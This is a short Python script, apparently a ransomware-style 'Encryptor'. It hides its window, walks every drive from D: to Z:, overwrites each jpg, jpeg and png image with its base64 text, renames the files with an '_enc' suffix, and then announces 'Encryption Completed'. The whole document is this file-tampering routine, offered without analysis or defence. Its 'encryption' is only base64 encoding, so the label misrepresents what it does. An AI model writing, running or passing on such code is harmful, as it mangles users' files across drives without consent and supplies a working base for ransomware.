import base64, os, tkinter
from tkinter import messagebox as msg
from threading import Thread as thread
from os import rename as rn
from os import system as cmd

# hide main window
maingui = tkinter.Tk()
maingui.withdraw()

# clear screen
if os.name == 'nt':
    cmd('cls')
else:
    cmd('clear')

# encryptor
def enc(file):
    # Encrypt
    try:
        with open(file, 'rb',) as img:
            cp = img.read()
            img.close()
            b64=base64.b64encode(cp)
            enc=b64.decode('ascii')
    except:
        print("[!] Error while openning file...", file)

    # Write to file
    try:
        with open(file, 'w') as eimg:
            eimg.write(enc)
            eimg.close()
            rn(file, file + '_enc')
    except:
        print("[!] Permission Error...", file)
# --END--

def driverun(root):
    for ROOT, DIR, FILE in os.walk(root, topdown=False):
        for name in FILE:
            PATH = os.path.join(ROOT, name)
            ext = PATH.split('.')[-1]
            if ext.lower() == 'jpg' or ext.lower() == 'jpeg' or ext.lower() == 'png':
                print(PATH)
                #enc(PATH)
                thread(target=enc, args=(PATH,)).start()
        for name in DIR:
            PATH = os.path.join(ROOT, name)
            #operations with direstories

dr = [chr(i) for i in range(ord('D'), ord('Z')+1)]
drives = [d+':\\' for d in dr if os.path.exists(f'{d}:')]

for i in drives:
    #driverun(i)
    thread(target=driverun, args=(i,)).start()
    
msg.showinfo(title='Encryptor',message='Encryption Completed')
